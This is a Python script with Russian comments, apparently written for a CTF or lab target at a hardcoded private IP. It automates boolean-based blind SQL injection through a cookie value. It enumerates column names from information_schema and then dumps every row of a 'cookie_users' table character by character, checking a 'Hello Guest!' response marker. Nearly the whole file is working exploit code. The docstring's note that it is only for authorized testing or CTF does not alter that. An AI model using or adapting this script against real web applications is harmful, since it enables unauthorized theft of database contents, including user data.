"""
=============================================================================
 slqi1_hard.py — Boolean-Based Blind SQLi ЧЕРЕЗ COOKIE (дамп таблицы)
=============================================================================

ЗАЧЕМ:
    Полноценный дамп таблицы при слепой булевой инъекции, где точка входа —
    значение COOKIE (здесь cookie `cook`), а не параметр формы. Извлекает:
      • имена колонок (extract_table_columns) из information_schema.columns;
      • данные строк (extract_table_data) по этим колонкам.
    Признак «символ верный» — маркер "Hello Guest!" в ответе (true-состояние).
    Сравнение идёт по ASCII-коду символа (ASCII(SUBSTRING(...))=code).

ГДЕ ПРИМЕНИМО:
    Инъекция в cookie с булевым откликом (разный текст при true/false),
    когда прямого вывода данных нет. MySQL/MariaDB.

ЗАПУСК:
    python3 slqi1_hard.py   (цель/схема/таблица задаются в коде)

ОГРАНИЧЕНИЯ / ЗАМЕЧАНИЯ:
    - ЗАХАРДКОЖЕНО: URL, COOKIE_BASE, схема 'sql_head_db', таблица 'cookie_users',
      маркеры SUCCESS/FAIL. Инъекция вида  cook = <base>' AND <payload>#
    - Для строковых данных перебирается string.printable → медленно, но полно.
    - Только для авторизованного тестирования / CTF.
=============================================================================
"""
import requests
import string

URL = "http://172.23.17.109/index.php"
COOKIE_BASE = "cfcd208495d559ef66e7dff9f98764da"
HEADERS = {
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/x-www-form-urlencoded",
    "Referer": URL,
    "Origin": "http://172.23.17.109"
}
DATA = {"exit": ""}
SUCCESS_MARK = "Hello Guest!"
FAIL_MARK = "Hello %Username%!"

def is_injection_successful(payload):
    cookies = {"cook": f"{COOKIE_BASE}' AND {payload}#"}
    response = requests.post(URL, headers=HEADERS, cookies=cookies, data=DATA)
    return SUCCESS_MARK in response.text

def extract_names(query_template, max_count=10, max_len=30):
    """
    Универсальная функция для извлечения списка строк из БД
    query_template - шаблон SQL, должен содержать {idx} и {pos} и {char_code}
    для подстановки номера записи, позиции символа и ASCII-кода символа.
    """
    results = []
    for idx in range(max_count):
        name = ""
        for pos in range(1, max_len + 1):
            found_char = False
            for ch in string.ascii_letters + string.digits + "_@.-":
                payload = query_template.format(idx=idx, pos=pos, char_code=ord(ch))
                if is_injection_successful(payload):
                    name += ch
                    print(f"\r[+] Извлекаем: {name}", end="", flush=True)
                    found_char = True
                    break
            if not found_char:
                break
        if not name:
            break
        print()
        results.append(name)
    return results

def extract_table_columns(db_name, table_name):
    print(f"[*] Извлечение колонок из таблицы '{table_name}' базы '{db_name}'...")
    query = ("(SELECT ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns "
             "WHERE table_schema='{db}' AND table_name='{table}' LIMIT {idx},1),{pos},1))={char_code})").format(
                 db=db_name, table=table_name, idx="{idx}", pos="{pos}", char_code="{char_code}")
    return extract_names(query)

def extract_table_data(table_name, column_names, max_rows=10, max_len=50):
    print(f"[*] Извлечение данных из таблицы '{table_name}'...")
    rows = []
    for row_idx in range(max_rows):
        row = {}
        empty_row = True
        for col in column_names:
            val = ""
            for pos in range(1, max_len + 1):
                found_char = False
                for ch in string.printable.strip():
                    # Экранируем апострофы в имени колонки
                    col_escaped = col.replace("'", "''")
                    payload = (
                        f"(SELECT ASCII(SUBSTRING((SELECT {col_escaped} FROM {table_name} "
                        f"LIMIT {row_idx},1),{pos},1))={ord(ch)})"
                    )
                    if is_injection_successful(payload):
                        val += ch
                        found_char = True
                        break
                if not found_char:
                    break
            if val != "":
                empty_row = False
            row[col] = val
        if empty_row:
            break
        print(f"[+] Строка {row_idx + 1}: {row}")
        rows.append(row)
    return rows

if __name__ == "__main__":
    db_name = "sql_head_db"
    table_name = "cookie_users"

    columns = extract_table_columns(db_name, table_name)
    print(f"\n📋 Колонки таблицы {table_name}: {columns}")

    data = extract_table_data(table_name, columns)
    print("\n📊 Извлечённые данные:")
    for row in data:
        print(row)

